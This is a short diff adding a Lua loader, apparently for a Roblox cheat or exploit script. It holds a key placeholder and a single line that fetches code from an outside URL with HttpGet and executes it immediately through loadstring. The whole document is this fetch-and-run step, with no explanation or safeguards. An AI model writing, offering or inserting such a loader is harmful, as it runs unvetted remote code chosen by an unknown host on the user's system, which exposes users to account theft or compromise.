@@ -1,0 +1,2 @@
+script_key = "" -- your key here
+loadstring(game:HttpGet("https://api.luasec.org/loader/1737e47d74f2"))()
